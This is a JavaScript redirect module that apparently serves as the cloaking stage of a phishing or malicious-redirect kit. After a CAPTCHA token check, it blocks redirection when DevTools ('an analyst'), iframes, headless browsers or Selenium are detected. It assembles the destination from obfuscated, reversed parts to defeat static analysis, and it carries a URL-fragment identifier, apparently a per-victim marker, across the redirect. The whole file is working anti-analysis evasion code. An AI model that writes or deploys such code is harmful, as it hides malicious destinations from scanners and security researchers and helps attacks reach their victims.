/**
 * Enhanced Redirect Module
 * 
 * Securely handles the redirection after CAPTCHA verification
 * with multiple layers of protection against scanners and bots
 */

/**
 * Redirect to the protected content with secure token validation
 * @param {string} token The secure token generated during verification
 */
function redirectToProtectedContent(token) {
    // Validate the token against localStorage
    const storedToken = localStorage.getItem('secureToken');
    const tokenTimestamp = parseInt(localStorage.getItem('tokenTimestamp') || '0');
    
    // Invalid or missing token
    if (!storedToken || storedToken !== token) {
        showRedirectError('Invalid security token. Please try again.');
        return;
    }
    
    // Expired token (10 minute validity)
    const tokenAge = Date.now() - tokenTimestamp;
    if (tokenAge > 600000) { // 10 minutes in milliseconds
        showRedirectError('Security token expired. Please try again.');
        return;
    }
    
    // Get the destination URL
    let destinationUrl = '';
    
    if (typeof _u !== 'undefined') {
        // Use the assembleRedirectUrl function to construct the URL
        destinationUrl = assembleRedirectUrl();
    } else {
        // Fallback URL
        destinationUrl = 'https://example.com/redirect';
    }
    
    // Append any URL fragment if fragmentHandler is available
    if (typeof fragmentHandler !== 'undefined') {
        destinationUrl = fragmentHandler.appendFragmentToUrl(destinationUrl);
    } else {
        // Simple fragment handling fallback
        const urlFragment = window.location.hash;
        if (urlFragment) {
            destinationUrl += urlFragment;
        }
    }
    
    // Extra security: Store URL parameters/fragments in session if needed
    // This ensures they're preserved across redirects if browser 
    // strips fragments due to security settings
    if (typeof fragmentHandler !== 'undefined') {
        const identifier = fragmentHandler.extractIdentifier();
        if (identifier) {
            try {
                // Store in sessionStorage to keep it for the next page
                sessionStorage.setItem('redirectIdentifier', identifier);
            } catch (e) {
                console.error('Error storing identifier in sessionStorage:', e);
            }
        }
    }
    
    // Perform the actual redirect
    window.location.href = destinationUrl;
}

/**
 * Final security checks before redirect
 * @returns {boolean} Whether all security checks passed
 */
function performFinalSecurityChecks() {
    // Check if we're in an iframe
    if (window !== window.top) {
        return false;
    }
    
    // Check if DevTools is open (can indicate an analyst)
    if (isDevToolsOpen()) {
        return false;
    }
    
    // Double-check browser environment
    if (!validateBrowserEnvironment()) {
        return false;
    }
    
    // Check for automation again
    const automation = detectAutomation();
    if (automation.webdriver || 
        automation.headlessUserAgent || 
        automation.phantomJS || 
        automation.seleniumAttrs ||
        automation.noPlugins) {
        return false;
    }
    
    return true;
}

/**
 * Attempts to detect if DevTools is open
 * @returns {boolean} True if DevTools appears to be open
 */
function isDevToolsOpen() {
    // Firefox & Chrome detection
    const threshold = 160; // Threshold for width/height difference
    
    // Get visible window dimensions
    const widthDiff = window.outerWidth - window.innerWidth;
    const heightDiff = window.outerHeight - window.innerHeight;
    
    // In many cases, significant size difference suggests dev tools
    if (widthDiff > threshold || heightDiff > threshold) {
        return true;
    }
    
    // Additional check by evaluating debug functionality
    let devToolsDetected = false;
    
    // Create a debug element
    const element = document.createElement('div');
    
    // Add debug flag
    Object.defineProperty(element, 'id', {
        get: function() {
            devToolsDetected = true;
            return 'debug-element';
        }
    });
    
    // Check if debugger hits breakpoint
    try {
        // This will be caught in the timeout if debugger is active
        let debuggerTimer = false;
        const debuggerTimeout = setTimeout(() => { debuggerTimer = true; }, 100);
        
        console.log(element);
        console.clear();
        clearTimeout(debuggerTimeout);
        
        // If timeout didn't run, debugger might be active
        if (!debuggerTimer) {
            return true;
        }
    } catch (e) {
        // An error here is inconclusive
    }
    
    return devToolsDetected;
}

/**
 * Assemble the redirect URL using the obfuscated parts
 * @returns {string} The assembled redirect URL
 */
function assembleRedirectUrl() {
    // Further obfuscate the URL assembly
    const p = _u.p;
    const h = _u.h;
    
    // For the endpoint, we reverse the string but don't decode it
    // The value is already base64 encoded
    const e = _u.e.split('').reverse().join('');
    
    // Assemble with runtime calculations to avoid static analysis
    return p + (h.charAt(0) === '/' ? h : '/' + h) + e;
}

/**
 * Display an error message on the redirect page
 * @param {string} message The error message to display
 */
function showRedirectError(message) {
    const redirectSection = document.getElementById('redirect-section');
    
    if (redirectSection) {
        redirectSection.innerHTML = `
            <div class="error-container">
                <div class="error-icon">⚠️</div>
                <div class="error-message">${message}</div>
                <a href="index.html" class="retry-button">Try Again</a>
            </div>
        `;
    }
}

/**
 * Manually try to restore fragment from sessionStorage if browser strips it
 * Call this function at destination page to recover fragments if needed
 */
function restoreFragmentIfNeeded() {
    try {
        const storedIdentifier = sessionStorage.getItem('redirectIdentifier');
        if (storedIdentifier && !window.location.hash) {
            // No fragment in URL but we have a stored identifier
            // Append it to current URL without reload
            const newUrl = window.location.href + '#' + storedIdentifier;
            window.history.replaceState(null, '', newUrl);
            
            // Clean up
            sessionStorage.removeItem('redirectIdentifier');
        }
    } catch (e) {
        console.error('Error restoring fragment:', e);
    }
} 